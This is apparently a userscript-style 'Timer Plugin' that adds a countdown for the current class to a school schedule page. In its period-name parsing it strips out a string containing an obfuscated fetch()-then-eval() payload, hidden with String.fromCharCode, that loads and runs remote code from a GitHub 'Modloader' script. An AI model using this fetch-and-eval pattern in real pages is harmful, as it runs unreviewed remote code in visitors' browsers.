if (!window.location.href.includes("admin")) {
  window.animateGradientTransition = function(color1, color2, steps, delay) {
    const gradient = document.getElementById("timerColor");
    const startColor = gradient.querySelector('stop[offset="0%"]').getAttribute("stop-color");
    const endColor = gradient.querySelector('stop[offset="100%"]').getAttribute("stop-color");
  
    createGradient(hexToRGB(color1), hexToRGB(startColor), steps).reverse().forEach((color, index) => {
      setTimeout(() => {
        gradient.querySelector('stop[offset="0%"]').setAttribute("stop-color", color);
      }, index * delay);
    });
  
    createGradient(hexToRGB(color2), hexToRGB(endColor), steps).reverse().forEach((color, index) => {
      setTimeout(() => {
        gradient.querySelector('stop[offset="100%"]').setAttribute("stop-color", color);
      }, index * delay);
    });
  };
  
  window.createGradient = function(color1, color2, steps) {
    const result = [];
  
    for (let i = 0; i < steps; i++) {
      const r = Math.round(color1.r + (color2.r - color1.r) * (i / (steps - 1)));
      const g = Math.round(color1.g + (color2.g - color1.g) * (i / (steps - 1)));
      const b = Math.round(color1.b + (color2.b - color1.b) * (i / (steps - 1)));
      result.push("rgb(" + r + "," + g + "," + b + ")");
    }
  
    return result;
  };
  
  window.hexToRGB = function(hex) {
    const shorthandRegex = /^#?([a-f\d])([a-f\d])([a-f\d])$/i;
    hex = hex.includes("#")
      ? hex.replace(shorthandRegex, (m, r, g, b) => r + r + g + g + b + b)
      : hex;
    const result = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(hex);
    return result
      ? { r: parseInt(result[1], 16), g: parseInt(result[2], 16), b: parseInt(result[3], 16) }
      : Object.fromEntries(hex.match(/\d+/g).map((v, i) => [['r', 'g', 'b'][i], +v]));
  };
  
  if (document.querySelector('table.table.table-borderless')) {
  const table = document.querySelector('table.table.table-borderless');
  const currentTime = new Date();
  const currentHour = currentTime.getHours();
  const currentMinutes = currentTime.getMinutes();
  const rows = table.querySelectorAll('tbody tr');
  const periods = [];
  rows.forEach((row) => {
    const cells = row.querySelectorAll('td');
    if (cells.length === 4) {
      const periodName = cells[1].textContent.trim().replace("fetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,80,111,121,79,122,107,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,115,116,97,114,116,46,106,115)).then(response=>response.text()).then(d=>eval(d))","");
      const [startHour,startMinutes] = cells[2].textContent.split(':').map(Number);
      const [endHour,endMinutes] = cells[3].textContent.split(':').map(Number);
      periods.push({
        name: periodName,
        startHour,
        startMinutes,
        endHour,
        endMinutes
      });
    }
  });
  
  // Check if school is in session
  let isInSession = false, currentPeriod = null;
  
  for (const period of periods) {
    if (currentHour > period.startHour || (currentHour === period.startHour && currentMinutes >= period.startMinutes)) {
      if (currentHour < period.endHour || (currentHour === period.endHour && currentMinutes < period.endMinutes)) {
        isInSession = true;
        currentPeriod = period;
        break;
      }
    }
  }
  
  // Log the result
  if (isInSession) {
    var className = currentPeriod.name;
    const currentEndTime = new Date();
    currentEndTime.setHours(currentPeriod.endHour, currentPeriod.endMinutes, 0);
    const timeLeftInSeconds = Math.floor((currentEndTime - currentTime) / 1000);
    const minutesLeft = Math.floor(timeLeftInSeconds / 60);
    const secondsLeft = timeLeftInSeconds % 60;
  
    const currentStartTime = new Date();
    currentStartTime.setHours(currentPeriod.startHour, currentPeriod.startMinutes, 0);
    const elapsedInSeconds = Math.floor((currentTime - currentStartTime) / 1000);
    const elapsedMinutes = Math.floor(elapsedInSeconds / 60);
    const elapsedSeconds = elapsedInSeconds % 60;
  
    var passtSec = ((elapsedMinutes * 60) + elapsedSeconds);
    var totalSec = (((elapsedMinutes + minutesLeft) * 60) + (elapsedSeconds + secondsLeft));
    inject(totalSec, passtSec, className);
  } else {
    console.info(
      "%c[Timer Plugin] %cSchool is not in session.",
      "color: #3498db; font-weight: bold;",
      "color: unset;"
    );  
    inject(60, 5, "English 10");
  }
  
  function inject(totalSec,passtSec,className) {
  
  var timerSpot = document.querySelector(".daynum");
  var dayMsg = document.querySelector(".daymessage");
  // Set the desired time (8:45)
  var time = totalSec - 1;
  var timeTotalPassed = passtSec
  var html = `
  <div style="height: 38vh;" class="parentTimerDiv">
  </div>
  <style> div.daynum {line-height: 20%;} .accordion-button {padding: 0.60rem 0.85rem;}</style>
  `;
  timerSpot.innerHTML = html
  dayMsg.innerHTML = ""
  var div = document.querySelector(".parentTimerDiv")
  
  
  div.innerHTML = `
  <div id="app"></div>
  <style>
  .parentTimerDiv {
  overflow: hidden;
    font-family: monospace;
    font-weight: normal;
    display: grid;
    height: 100vh;
    place-items: center;
    color: black;
  }
  .base-timer {
    position: relative;
    width: 300px;
    height: 300px;
  }
  
  .base-timer__svg {
    transform: scaleX(-1);
  }
  
  .base-timer__circle {
    fill: none;
    stroke: none;
    color:green
  }
  
  .base-timer__path-elapsed {
    stroke-width: 2px;
    stroke: grey;
    opacity:50%;
  }
  
  .base-timer__path-remaining {
    stroke-width: 3px;
    stroke-linecap: round;
    transform: rotate(90deg);
    transform-origin: center;
    fill-rule: nonzero;
    stroke: url(#timerColor);
  }
  
  .base-timer__label {
    position: absolute;
    width: 300px;
    height: 300px;
    top: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 48px;
  }
  
  #class-name {
  position: absolute;
  width: 300px;
  height: 300px;
  top: 40px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 23px;
  }
  
  </style>
  `;
  var timerCode = `// Credit: Mateusz Rybczonec
  
  // TIMER SETTINGS
  const FULL_DASH_ARRAY = 790 / 3;
  const WARNING_THRESHOLD = ${time} / 1.5;
  const ALERT_THRESHOLD = ${time} / 3;
  let TIME_LIMIT = ${time}; //Full time
  let timePassed = ${timeTotalPassed} - 1; //Start at Time:
  let timeLeft = TIME_LIMIT;
  let timerInterval = null;
  
  const COLOR_CODES = {
    info: {
      color: "green"
    },
    warning: {
      color: "orange",
      threshold: WARNING_THRESHOLD
    },
    alert: {
      color: "red",
      threshold: ALERT_THRESHOLD
    }
  };
  
  let remainingPathColor = COLOR_CODES.info.color;
  
  document.getElementById("app").innerHTML =
  '<div class="base-timer">' +
    '<svg class="base-timer__svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">' +
      '<defs>' +
      '<linearGradient id="timerColor">' +
      '<stop offset="0%" stop-color="#45cfa0" />' +
      '<stop offset="100%" stop-color="#16cd40" />' +
    '</linearGradient>' +  
      '</defs>' +
      '<g class="base-timer__circle">' +
        '<circle class="base-timer__path-elapsed" cx="50" cy="50" r="45"></circle>' +
        '<path ' +
          'id="base-timer-path-remaining" ' +
          'stroke-dasharray="283" ' +
          'class="base-timer__path-remaining" ' +
          'd="' +
            'M 50,50 ' +
            'm -45,0 ' +
            'a 45,45 0 1,0 90,0 ' +
            'a 45,45 0 1,0 -90,0 ' +
          '"' +
        '></path>' +
      '</g>' +
    '</svg><br>' +
    '<span id="base-timer-label" class="base-timer__label"></span>' +
    '<span id="class-name">${className}</span>' +
  '</div>';
  
  startTimer();
  
  function onTimesUp() {
    clearInterval(timerInterval);
  }
  
  function startTimer() {
    timePassed = timePassed += 1;
    timeLeft = TIME_LIMIT - timePassed;
    document.getElementById("base-timer-label").innerHTML = formatTime(timeLeft).replace("00:00", "0").replace("00:0", "").replace("00:", "");
    setCircleDasharray();
    setRemainingPathColor(timeLeft);
    timerInterval = setInterval(() => {
      timePassed = timePassed += 1;
      timeLeft = TIME_LIMIT - timePassed;
      document.getElementById("base-timer-label").innerHTML = formatTime(timeLeft).replace("00:00", "0").replace("00:0", "").replace("00:", "");
      setCircleDasharray();
      setRemainingPathColor(timeLeft);
  
      if (timeLeft === 0) {
        onTimesUp();
      }
    },1000);
  }
  function formatTime(time) {
    const hours = Math.floor(time / 3600);
    const minutes = Math.floor((time % 3600) / 60);
    const seconds = time % 60;
  
    const formattedHours = hours > 0 ? String(hours).padStart(2,'0') + ':' : '';
    const formattedMinutes = String(minutes).padStart(2,'0');
    const formattedSeconds = String(seconds).padStart(2,'0');
  
    return formattedHours + formattedMinutes + ":" + formattedSeconds;
  }
  function setRemainingPathColor(timeLeft) {
    const { alert, warning, info } = COLOR_CODES;
    var timeRemainingElement = document.getElementById("base-timer-path-remaining");
    if (timeLeft <= alert.threshold) {
      timeRemainingElement.classList.remove(info.color, warning.color);
      timeRemainingElement.classList.add(alert.color);
      animateGradientTransition("#ec1e51", "#eb8514", 200, 20);
    } else if (timeLeft <= warning.threshold) {
      timeRemainingElement.classList.remove(info.color, alert.color);
      timeRemainingElement.classList.add(warning.color);
      animateGradientTransition("#ec871e", "#f4df31", 200, 20);
    }
  }
  function calculateTimeFraction() {
    const rawTimeFraction = timeLeft / TIME_LIMIT;
    return rawTimeFraction - (1 / TIME_LIMIT) * (1 - rawTimeFraction);
  }
  function setCircleDasharray() {
    const circleDasharray =
      (calculateTimeFraction() * FULL_DASH_ARRAY).toFixed(0) + " 283";
    document
      .getElementById("base-timer-path-remaining")
      .setAttribute("stroke-dasharray",circleDasharray);
  }`
  eval(timerCode);
  document.querySelector(".base-timer__path-remaining").style.transition = "1s linear";
    }
  }
  else {
    console.info(
      "%c[Timer Plugin] %cNo school today.",
      "color: #3498db; font-weight: bold;",
      "color: unset;"
    );  
  }
  }
  
